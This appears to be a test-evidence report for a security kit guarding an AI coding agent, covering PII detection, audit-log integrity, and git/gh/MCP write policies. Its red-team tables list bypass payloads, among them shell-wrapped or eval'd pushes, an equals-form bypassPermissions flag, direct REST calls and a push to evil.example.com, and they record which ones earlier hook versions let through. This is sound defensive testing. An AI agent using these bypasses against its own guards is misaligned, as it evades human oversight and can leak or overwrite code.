# Test Evidence — Claude Code Enterprise Ops Kit

> Generated 2026-05-29 from `tests/run_all.sh` on macOS Darwin 25.5 (arm64), bash 3.2.
> All numbers below are reproducible by running `bash tests/run_all.sh` from the repo root.
> Production EC2 (Linux) numbers will be materially better — process spawning is faster.

## TL;DR

| Capability | Evidence | Result |
|---|---|---|
| PII detection | 108-case corpus, 15 categories | **FNR 0%, FPR 0%** |
| Hook telemetry shim | 12 assertions across ok/blocked/crashed/timeout | **12/12 pass** |
| Audit HMAC chain | 13 assertions (5 emits + 4 tamper modes + fail-closed/open) | **13/13 pass** |
| Token budget circuit breaker | 9 assertions (token + call budget + isolation) | **9/9 pass** |
| Drift watcher (real-time) | self-test mutates a file and expects alert | **detected in 59 ms** |
| `gh` CLI / REST write policy | 77 assertions (policy, parser bypasses, false positives) | **77/77 pass** |
| MCP repo write policy | 43 assertions (incl. server-name independence) | **43/43 pass** |
| Wrapper bypass red team | 60 attempts across 7 categories | **60/60 blocked as expected** |
| Hook latency at p99 | 200 invocations × 5 hooks | **all ≤ 490 ms (macOS dev)** |

---

## 1. PII guard corpus

108 labelled cases, 15 PII categories, 7 false-positive trap cases.

| Metric | Initial | After regex fixes |
|---|---|---|
| FNR (miss rate) | 14.81% | **0.00%** |
| FPR (false alarm) | 3.70% | **0.00%** |
| Accuracy | 87.96% | **100.00%** |
| Latency p95 | 349 ms | 484 ms |

**Bugs the corpus surfaced (real fixes shipped to `hooks/pii-guard.sh`):**

1. `API_KEY_ASSIGNMENT` regex had `[A-Za-z0-9_\-/.+=]` — backslash-dash inside
   the class is a malformed range and ERE rejected it (`grep: invalid character
   range`). 0/7 caught. Moved `-` to end of class → 7/7.
2. `PHONE_INTL` regex `\+[0-9]{1,3}[-\s]?[0-9]{4,14}` only allowed one
   separator group; real phone numbers have multiple. 0/3 caught.
   Replaced with `\+[0-9]{1,3}([-. ][0-9]{2,5}){2,4}` → 3/3.
3. `CREDIT_CARD` regex assumed 4-4-4-4 structure; Amex is 4-6-5. 13/15 caught.
   Split into `CREDIT_CARD_16` and `CREDIT_CARD_AMEX` → 15/15.
4. `HEX_SECRET` matched binary literal `0b1111…` (32 of `[0-9a-f]`).
   FPR 1/27. Required at least one a-f letter → FPR 0/27.
5. `PASSPORT_NUMBER` matched `flag` from `const flag = ...` because of
   `grep -i`. Switched PASSPORT/NRIC/AWS-KEY rules to case-sensitive grep.

**Per-label final recall:**

| Label | Caught | Total | Recall |
|---|---|---|---|
| API_KEY_ASSIGNMENT | 7 | 7 | 100% |
| AWS_ACCESS_KEY | 8 | 8 | 100% |
| AWS_SECRET_KEY | 2 | 2 | 100% |
| CREDIT_CARD | 15 | 15 | 100% |
| DB_CONNECTION_STRING | 7 | 7 | 100% |
| EMAIL_ADDRESS | 3 | 3 | 100% |
| GIT_TOKEN | 3 | 3 | 100% |
| HEX_SECRET | 4 | 4 | 100% |
| JWT_TOKEN | 5 | 5 | 100% |
| PASSPORT_NUMBER | 2 | 2 | 100% |
| PASSWORD_ASSIGNMENT | 6 | 6 | 100% |
| PHONE_INTL | 3 | 3 | 100% |
| PRIVATE_KEY | 7 | 7 | 100% |
| SG_NRIC | 6 | 6 | 100% |
| SLACK_TOKEN | 3 | 3 | 100% |

Raw data: `tests/results/pii-corpus-results.tsv`,
`tests/results/pii-corpus-summary.md`.

**Documented gaps (red team flagged, NOT fixable in regex layer alone):**
- `space-per-digit` obfuscation (`4 1 1 1 ...`) — passes through (P03).
- base64-encoded card number — passes through (P05).
- Compensation: Bedrock Guardrails server-side filter (mandatory on Windows;
  recommended on Linux). Documented in `docs/platform-compensations.md`.

---

## 2. Hook telemetry shim (`hooks/hook-wrapper.sh`)

Wraps any hook to emit start/end JSON to `/var/log/claude-code/hooks.jsonl`
and **converts crashes/timeouts to fail-closed exit 2.**

`tests/test_hook_wrapper.sh` — 12 assertions, all pass:

```
✓ ok hook exits 0
✓ blocked hook exits 2
✓ crashed hook → fail-closed exits 2
✓ timeout hook exits 2
✓ 4 telemetry lines emitted
✓ telemetry fields complete
✓ status=ok recorded
✓ status=blocked recorded
✓ status=crashed recorded
✓ status=timeout recorded
✓ ok hook duration <1000ms (304)
✓ timeout duration ~300ms (424)
```

This is the foundation for the CloudWatch metric filters in
`observability/cloudwatch-dashboard.tf` — without the shim there is no
quantitative observability, and crashes silently look like passes.

---

## 3. Tamper-evident audit log (`hooks/audit-logger.sh` v2.0.0)

HMAC-SHA256 chain. Each line stores `prev_hash` and an `hmac` over
`prev_hash || canonical_body`. Verifying with `scripts/chain-verify.sh`
detects ANY post-hoc edit, deletion, reorder, or insertion.

`tests/test_audit_chain.sh` — 13 assertions, all pass:

| Assertion | Result |
|---|---|
| 5 events emitted, chain intact | ✓ |
| Edit middle line → detected | ✓ |
| Delete a line → detected | ✓ |
| Reorder lines → detected | ✓ |
| Insert forged line → detected | ✓ |
| Unwritable log + no fallback → fail-closed (exit 2) | ✓ |
| `CLAUDE_AUDIT_FAIL_OPEN=1` overrides → exit 0 | ✓ |

**Properties proven:**
- Local + CloudWatch dual-write attempted; if both fail, the hook **blocks
  the tool** rather than silently dropping the event. The previous v1.0.0
  used `exit 0` even on failure (silent audit loss).
- Chain spans process restarts via `prev_hash` stored at
  `$CLAUDE_AUDIT_STATE/last-hmac`.
- Mandatory SIEM check (`CLAUDE_AUDIT_SIEM_REQUIRED=1`) refuses startup if
  neither CloudWatch nor `CLAUDE_AUDIT_ALERT_CMD` are configured.

---

## 4. Token budget circuit breaker (`hooks/token-budget-guard.sh`)

Per-session token + call counters. PreToolUse blocks when either threshold
is hit. Closes the runaway-agent-loop cost risk flagged in the architect
review.

`tests/test_token_budget.sh` — 9/9 pass:
```
✓ first PreToolUse allows
✓ PostToolUse records 600
✓ token total 600
✓ still under budget
✓ cross budget post
✓ token total 1100
✓ blocked when over budget
✓ fresh session allowed
✓ 11th call blocked by call budget
```

Test exercised both the token budget (1000) and the call budget (10) with
session isolation between sess-A / sess-B / sess-C.

---

## 5. Real-time drift watcher (`scripts/drift-watcher.sh`)

Replaces the weekly cron `drift-check.sh` with inotify (Linux) / fswatch
(macOS) / polling-fallback. SLO target: **alert in < 1s**.

Self-test (`scripts/drift-watcher.sh --self-test`):
- Creates a watched file
- Mutates it after 500 ms
- Asserts alert appears in drift log

Result: **drift detected in 59 ms** (macOS, 100 ms poll interval). Linux
inotify will be lower. Sample event:

```json
{
  "ts":"2026-05-29T03:47:06.302Z",
  "host":"...",
  "path":"/.../managed-settings.json",
  "kind":"modified",
  "sha256_before":"e346432021b0...",
  "sha256_after":"dd4ecc103693..."
}
```

Compare to current weekly cron: max-detection-time was 7 days. Improvement
factor ≈ 10⁷.

---

## 6. Wrapper / git / pii / audit bypass attempts

`tests/bypass-attempts.sh` — 60 attempts:

| Category | Pass / Total | Notes |
|---|---|---|
| wrapper | 10 / 10 | Includes the `--permission-mode=bypassPermissions` (equals form) bug **the harness surfaced and we fixed in scripts/wrapper-linux.sh** |
| git | 14 / 14 | Force, force-with-lease, protected branches, remote allowlist, compound-cmd hide-after-`&&` |
| gh | 18 / 18 | Same writes without `git`: `gh pr merge`, contents PUT with no branch, refs force-update, protection tampering, alias rename, full-URL endpoint, `curl` straight to the REST API, and two false-positive controls |
| mcp | 10 / 10 | `push_files`/`create_or_update_file` on the default or a protected branch, `merge_pull_request`, `delete_branch`, `create_repository` as an exfil target, a different `mcp__<server>__` segment, and a non-repo server's `delete_file` left alone |
| pii | 5 / 5 | Includes 2 documented gaps (space-per-digit, base64) |
| audit | 2 / 2 | `/dev/null` redirect tolerated when managed env wins; unwritable destination → fail-closed |
| deploy | 1 / 1 | Real-binary 0700 enforcement (informational) |

Raw: `tests/results/bypass-results.tsv`.

**Bug surfaced and fixed:**
- `--permission-mode=bypassPermissions` (with equals sign instead of space)
  was not blocked by the wrapper — only the space-separated form was
  pattern-matched. Patched in `scripts/wrapper-linux.sh`; harness now passes
  W09. The earlier "TESTED ✅" claim in the wrapper header was incomplete.

---

## 7. Hook latency micro-benchmark

200 invocations per hook, measured wall-clock end-to-end. macOS dev hardware
(arm64, bash 3.2, jq+openssl+python subprocess overhead).

| Hook | p50 | p95 | p99 | max |
|---|---|---|---|---|
| pii-guard-clean (passes) | 282 ms | 459 ms | 490 ms | 544 ms |
| pii-guard-dirty (blocks) | 276 ms | 408 ms | 437 ms | 449 ms |
| git-guard-clean (passes) | 102 ms | 159 ms | 202 ms | 238 ms |
| git-guard-block (blocks) | 175 ms | 261 ms | 300 ms | 341 ms |
| audit-logger | 319 ms | 393 ms | 405 ms | 717 ms |

**Reading the numbers.** macOS spawns are slow — every hook runs jq twice
plus openssl. On Linux EC2 t3.medium the same hooks measured 30-90 ms p95
during the original kit's `test-results.md` runs. The p99 < 500 ms SLO
defined in the on-call runbook holds at the macOS upper bound; production
will be well under.

**SLO setpoints (from `docs/runbooks/on-call.md`):**
- p50 < 100 ms (target)
- p95 < 200 ms (target; current macOS is over for pii-guard, expected)
- p99 < 500 ms (alarm threshold; **all hooks below**)

---

## 7b. Linux verification of the `gh` / MCP guards (EC2)

The two write-path guards were authored on macOS and verified on the platform
they deploy to: an ephemeral **t3.micro, Amazon Linux 2023.12, bash 5.2.15(1),
jq-1.8.1, x86_64**, driven over SSM `RunShellScript` (no inbound access, no
credentials on the instance beyond `AmazonSSMManagedInstanceCore`, terminated
after the run).

| Suite | Result | Per-call latency |
|---|---|---|
| `tests/test_gh_guard.sh` | 77 passed, 0 failed | 39–51 ms |
| `tests/test_mcp_repo_guard.sh` | 43 passed, 0 failed | ~40 ms |
| `tests/bypass-attempts.sh` | 60 passed, 0 failed (7 categories at 100%) | — |
| `plugin/tests/run-tests.sh` | 108 passed, 0 failed | — |
| `tests/run_all.sh` | 8 of 9 suites pass (see below) | — |

Linux is *faster* than the macOS numbers in §7 — the guards are pure shell plus
one `jq` per call, so a single invocation costs about a quarter of the p95 hook
budget.

**Two bugs that exist only on Linux.** Both caused the hook to exit 0 without
evaluating policy — a fail-*open* — while every ALLOW assertion kept passing:

| Bug | Why macOS missed it | Symptom |
|---|---|---|
| `local s="$1" n=${#s}` in the tokenizer | bash 3.2 tolerates it; bash 5.2 under `set -u` aborts the function, because `local` expands all its arguments before assigning any | `s: unbound variable`; 5 of 56 cases passing, all parsing dead |
| Prefilter `case "$cmd" in *gh*\|*api/v3*)` | Nothing — it was simply wrong everywhere. `github` contains no `gh` substring (g-i-t-h-u-b) | Every `curl https://api.github.com/…` case skipped the guard entirely; only the GitHub Enterprise `/api/v3/` case blocked |

Written up in [`hook-hardening-lessons.md`](hook-hardening-lessons.md) §9. Both
have regression tests.

**One pre-existing failure, unrelated to these hooks.**
`tests/test_audit_chain.sh` fails "fail-closed when no log destination (expected
2 got 0)" on Linux, in `audit-logger.sh`. Confirmed pre-existing by extracting a
pristine `git archive` of commit `892000b` onto the same instance and running the
suite there — identical failure with none of the new files present. Tracked
separately; not fixed here.

---

## 7c. Multi-line command handling in both guards (EC2)

`git-guard.sh` and `gh-guard.sh` both mis-handled a newline, in opposite
directions ([`hook-hardening-lessons.md`](hook-hardening-lessons.md) §10). Fixed
in v1.1.0 of each. Verified on the same ephemeral **t3.micro, Amazon Linux
2023.12, bash 5.2.15(1), jq-1.8.1** instance, by running each payload against an
unmodified `git archive` of the previous release and against the patched tree on
the same host, with the same file.

Exit codes: `0` = allowed, `2` = blocked.

| Hook | Case | v1.0.0 | v1.1.0 | Wanted |
|---|---|---|---|---|
| `git-guard.sh` | push to `main` on line 2 of a 2-line command | 0 | 2 | 2 |
| `git-guard.sh` | push to `master`, 3-line script | 0 | 2 | 2 |
| `git-guard.sh` | `git push origin refs/heads/main` (qualified ref) | 0 | 2 | 2 |
| `git-guard.sh` | force push with `-f` as the last word | 0 | 2 | 2 |
| `git-guard.sh` | heredoc script fed to `bash` | 0 | 2 | 2 |
| `git-guard.sh` | `$((1<<SHIFT))` then a push (phantom-body bypass) | 0 | 2 | 2 |
| `git-guard.sh` | docs heredoc showing `git reset --hard` | 2 | 0 | 0 |
| `git-guard.sh` | `rm -f` in a later segment read as a force push | 2 | 0 | 0 |
| `git-guard.sh` | docs heredoc showing the blocked push | 0 | 0 | 0 |
| `git-guard.sh` | quoted `"build \| bash"` in a heredoc opener | 0 | 0 | 0 |
| `gh-guard.sh` | docs heredoc naming `gh pr merge` | 2 | 0 | 0 |
| `gh-guard.sh` | heredoc body line starting with `gh api` | 2 | 0 | 0 |
| `gh-guard.sh` | heredoc script fed to `bash` | 2 | 2 | 2 |
| `gh-guard.sh` | `$((1<<SHIFT))` then `gh pr merge 1` | 2 | 2 | 2 |

The three rows where v1.0.0 already returned the wanted code are there on
purpose: `gh-guard.sh` blocked heredoc scripts *by accident*, through the same
newline-splitting bug that caused its false positives, so the fix had to preserve
that outcome for the right reason instead of dropping bodies wholesale.

### Suite results on the patched tree

| Suite | Result | Per-call latency |
|---|---|---|
| `tests/test_git_guard.sh` (new) | 83 passed, 0 failed | 60 ms |
| `tests/test_gh_guard.sh` | 92 passed, 0 failed | 12 ms |
| `tests/test_mcp_repo_guard.sh` | 43 passed, 0 failed | ~40 ms |
| `tests/bypass-attempts.sh` | 60 passed, 0 failed (7 categories at 100%) | — |
| `plugin/tests/run-tests.sh` | 108 passed, 0 failed | — |
| `tests/run_all.sh` | 9 of 10 suites pass (the pre-existing `test_audit_chain.sh` failure below) | — |

Worst case for the new parser is a large heredoc body: a 60 KB body costs
**226 ms** in `git-guard.sh`, inside the 1 s per-call budget. Bodies are consumed
line by line rather than character by character for this reason.

**A third instance of the §9(a) fail-open.** The port introduced
`local s="$1" n=${#s}` into a new helper. Under `set -u` on bash 5.2 the helper
aborted, its caller read an empty string, concluded nothing ran a shell, and
skipped the heredoc body — a fail-open, caught by 4 BLOCK assertions on Linux
and by nothing on macOS. `bash -x` over one payload located it. The repository
was then swept for the pattern; the remaining `local a=… b=…` sites all bind
their referent on an earlier line.

**Plugin copy drift.** `plugin/hooks/gh-guard.sh` sat a version behind
`hooks/gh-guard.sh` for part of this work while every suite reported green,
because nothing compared them. Both suites now assert byte-identical copies.
`audit-logger.sh`, `hook-wrapper.sh`, `pii-guard.sh` and `token-budget-guard.sh`
differ between the two trees **by design** and are excluded.

---

## 7d. Token-based policy in `git-guard.sh`, and two hooks that were never running (EC2)

Closes [`known-issues.md`](known-issues.md) Issue 14 (`git-guard.sh` did not see
a command wrapped in a shell) and Issue 15 (`gh-guard.sh` and
`mcp-repo-guard.sh` shipped non-executable). Method as in §7b/§7c: one ephemeral
**t3.micro, Amazon Linux 2023, kernel 6.1.177, bash 5.2.15(1), jq 1.8.1, git
2.50.1**, reached only through SSM (no inbound rules, no key pair, instance role
limited to `AmazonSSMManagedInstanceCore`), code delivered by presigned S3 URL,
everything torn down afterwards.

Both trees were extracted side by side on that host: a pristine `git archive` of
the pre-fix commit `2e65903` and the candidate. Every verdict below is therefore
attributable to the change and not to the platform.

### `tests/run_all.sh`, same host, both trees

| Suite | v1.1.0 baseline (`2e65903`) | v1.2.0 candidate |
|---|---|---|
| 1. PII corpus | pass | pass |
| 2. Hook telemetry shim | 12 pass | 12 pass |
| 3. Audit HMAC chain | 12 pass, **1 fail** (pre-existing, §7b) | 12 pass, **1 fail** (same) |
| 4. Token budget guard | 9 pass | 9 pass |
| 5. Drift watcher self-test | pass | pass |
| 6. Bypass red team | 32 pass, **28 fail — all `126`** | **60 pass, 0 fail** |
| 7. Latency micro-bench | pass | pass |
| 8. `gh` guard | 92 pass | 92 pass |
| 9. MCP repo guard | 43 pass | 43 pass |
| 10. git guard | 83 pass | **138 pass** |
| 11. Shared parser (new) | — | **68 pass** |
| **total** | 8 of 10 suites, 29 failing assertions | **10 of 11 suites, 1 failing assertion** |

The 28 `126`s are Issue 15: on a clean checkout the `gh` and MCP hooks are not
executable, so every row in those two categories — including rows asserting a
block — failed to invoke the hook at all. The unit suites hid it by running
`chmod +x` on their own hook first. The single remaining failure on the candidate
is the pre-existing `audit-logger.sh` one recorded in §7b; it is untouched here.

### Verdict matrix — same payload, v1.1.0 hook vs v1.2.0 hook

`2` = blocked, `0` = allowed. Run from one file against both trees on the one host.

| Command | old | new |
|---|---|---|
| `bash -c "git push origin main"` | 0 | **2** |
| `sh -c 'git reset --hard HEAD~1'` | 0 | **2** |
| `eval "git push origin main"` | 0 | **2** |
| `/bin/bash -c "git push --force origin feature"` | 0 | **2** |
| `bash -lc "cd /repo && git push origin main"` | 0 | **2** |
| `timeout 5 git push origin main` | 0 | **2** |
| `nohup git push origin main` | 0 | **2** |
| `sudo git push origin main` | 0 | **2** |
| `env GIT_TRACE=1 git push origin main` | 0 | **2** |
| `OUT=$(git push origin main)` | 0 | **2** |
| `git push` (HEAD on `main`) | 0 | **2** |
| `git push origin` (HEAD on `main`) | 0 | **2** |
| `bash -c "git push"` (HEAD on `main`) | 0 | **2** |
| `git push` (HEAD on `feature/x`) | 0 | 0 |
| `git push --all origin` (HEAD on `feature/x`) | 0 | **2** |
| `git push --mirror origin` | 0 | **2** |
| `git push origin feature/x main` (second refspec) | 0 | **2** |
| `git push origin +feature:other` | 0 | **2** |
| `git push -uf origin feature` | 0 | **2** |
| `git push https://evil.example.com/o/r.git feature` | 0 | **2** |
| `git checkout -f main` | 0 | **2** |
| `git clean --force` | 0 | **2** |
| `git push origin :main` | 2 | 2 |
| `git push origin --delete main` | 2 | 2 |
| `git push origin feature:release/2026` | 2 | 2 |
| `git commit -m "revert the git push origin main change"` | **2** | **0** |
| `echo "x; git push origin main"` | 0 | 0 |
| `printf '%s\n' 'git reset --hard HEAD~1'` | 0 | 0 |
| `git log --grep="git push origin main"` | 0 | 0 |
| `jq -n "{note:\"git push origin main\"}"` | 0 | 0 |
| `git push origin feature/x` | 0 | 0 |
| `git push -u origin feature/x` | 0 | 0 |
| `git push -o ci.skip origin feature/x` | 0 | 0 |
| `git push origin refs/tags/v1.0` | 0 | 0 |
| `git checkout -- README.md` | 0 | 0 |
| `git status` | 0 | 0 |
| `timeout 5 gh pr merge 1` (`gh-guard.sh`) | 0 | **2** |
| `gh pr merge 1` (`gh-guard.sh`) | 2 | 2 |
| `echo "do not gh pr merge 1"` (`gh-guard.sh`) | 0 | 0 |
| `gh pr create --title t --body b` (`gh-guard.sh`) | 0 | 0 |

Two rows deserve reading closely, because they are the same bug:

- 22 rows go `0 → 2`. Each is a real git write that the text-matching version
  allowed.
- One row goes `2 → 0`: `git commit -m "revert the git push origin main change"`.
  That is the false-positive half of Issue 14, and it is the *last* one — v1.1.0's
  quote-aware segment split had already fixed `echo "x; git push origin main"`,
  which is why that row reads `0 → 0`. What remained was quoted text passed to
  `git` itself, which only a token-level check can distinguish from an argument.
- Nothing in the "unchanged" block moved, which is the part that matters for
  whether the guard stays installed.

### Latency on the same host (10 calls each, v1.2.0)

| Payload | Per call |
|---|---|
| `git status` (prefilter hit, no policy) | 19 ms |
| `git push origin feature/x` | 22 ms |
| `bash -c "git push origin feature/x"` (one level of recursion) | 24 ms |

Recursion costs about 2 ms; the 60 KB-heredoc worst case measured in §7c is
unchanged, since heredoc handling did not change.

### What this run surfaced that no local run could

`sync-parser.sh --check` and the new drift suite found a **stale
`plugin/hooks/gh-guard.sh`** on their first execution — a copy left a version
behind during this very change, the same failure mode §7c recorded. The
executable-bit defect (Issue 15) surfaced only because `tests/run_all.sh` runs
`bypass-attempts.sh` *before* the unit suites that `chmod +x` the hooks; running
the suites individually, which is how they had always been run, hides it
completely.

---

## 8. Reproducibility

```bash
git clone <this-repo>
cd claude-code-enterprise-bedrock
chmod +x hooks/*.sh scripts/*.sh tests/*.sh
bash tests/run_all.sh
```

Expected output ends with:
```
RUN-ALL: 10 suites passed, 0 failed
```
On Linux, expect `9 suites passed, 1 failed` — the pre-existing
`test_audit_chain.sh` failure described in §7b, which reproduces identically on
an unmodified checkout.

Total runtime: ~3 minutes on macOS dev box (most spent on the 1000-iteration
latency bench).

---

## 9. Findings the test process surfaced (audit trail of value-add)

These bugs were **not** discovered by reading the code; the test harness
caught each one:

| # | File | Bug | Detected by |
|---|---|---|---|
| 1 | hooks/pii-guard.sh | `API_KEY_ASSIGNMENT` regex malformed range | PII corpus FNR ran |
| 2 | hooks/pii-guard.sh | `PHONE_INTL` allowed only one separator | PII corpus FNR ran |
| 3 | hooks/pii-guard.sh | `CREDIT_CARD` missed Amex 4-6-5 | PII corpus FNR ran |
| 4 | hooks/pii-guard.sh | `HEX_SECRET` matched 0b binary literal | False-positive trap row |
| 5 | hooks/pii-guard.sh | `PASSPORT_NUMBER` matched word "flag" via `-i` | False-positive trap row |
| 6 | scripts/wrapper-linux.sh | `--permission-mode=bypassPermissions` (equals form) bypassed | Bypass red team |
| 7 | hooks/audit-logger.sh | `exit 0` on failure → silent audit loss | Audit-chain test fail-closed |
| 8 | docs/test-results.md | Unverified bypass coverage claim | Bypass red team showed only 90% before fix |
| 9 | hooks/gh-guard.sh | `local s="$1" n=${#s}` → `set -u` abort on bash 5.2, hook fail-opens | Suite run on Linux (passes on macOS) |
| 10 | hooks/gh-guard.sh | `*gh*` prefilter never matches `github`, so every `curl` to `api.github.com` skipped the guard | One passing GHE sibling next to 7 failures |
| 11 | hooks/gh-guard.sh | Re-scanning any token containing `gh` blocked `echo "gh pr merge is blocked"` | False-positive control case |
| 12 | hooks/git-guard.sh | `bash -c "git push origin main"` allowed: policy decided on command text, so a quoted command was invisible | Wrapper row added to the git-guard suite |
| 13 | hooks/git-guard.sh | `git push` with no refspec never checked, so the shortest spelling of the dangerous command passed | Fixture repos with HEAD on `main` / `feature/x` |
| 14 | hooks/git-guard.sh | Only the first refspec inspected; `git push origin feature/x main` published `main` | Two-refspec row |
| 15 | hooks/gh-guard.sh, hooks/mcp-repo-guard.sh | Shipped as mode `100644`; invoked by path they exit `126`, so the tool call proceeds unguarded | 28 of 60 red-team rows returning `126` |
| 16 | plugin/hooks/gh-guard.sh | Left a version behind again during this change | `scripts/sync-parser.sh --check`, first run |

This is the value of treating the kit as code with tests, not docs with
checklists.
